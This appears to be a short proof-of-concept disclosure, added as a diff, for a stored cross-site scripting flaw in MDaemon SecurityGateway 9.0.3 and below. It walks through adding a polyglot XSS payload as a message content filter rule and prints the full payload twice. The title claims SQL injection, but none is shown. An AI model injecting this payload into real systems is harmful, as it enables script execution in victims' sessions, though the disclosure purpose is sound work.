@@ -1,0 +1,22 @@
+#Title : XSS chained with SQL injection
+#Researcher : Abhash Khanal
+#Vendor : https://mdaemon.com/
+#Script Demo Url :https://SecurityGateway.dll?sid=FNMFIAHWGYEZMEPU&view=main
+#Version Affected : 9.0.3 and below
+#Date : 24 Sept 2023
+POC
+
+
+
+Step 1- I installed the security gateway exe file in my system and connect it with loacal host.
+step-2- I started visiting all the pages .
+step-3- I then visited security and inside security I visited filtering.
+step-4- After that I visted Message content filtering and found out that we could add a new rule over there.
+step-5- I added a new rule over there with a payload javascript:alert(1)//\";alert(1);<!--jaVasCript:/*/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//--><FRAME SRC="javascript:alert(1);"></textarea></style></iframe></noscript></noembed></template></option></select></script><img src=x onerror=alert(1)></title><script>alert(1)</script><img src=0 onerror=alert(1)><img src=x:x onerror=alert(1)> alert(1)//
+
+step-6- After the playload was loaded in the filter icon then if we preview the payload then we will get that the Payload is being executed.
+
+
+Payload used- javascript:alert(1)//\";alert(1);<!--jaVasCript:/*/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//--><FRAME SRC="javascript:alert(1);"></textarea></style></iframe></noscript></noembed></template></option></select></script><img src=x onerror=alert(1)></title><script>alert(1)</script><img src=0 onerror=alert(1)><img src=x:x onerror=alert(1)> alert(1)//
+
+XSS will execute
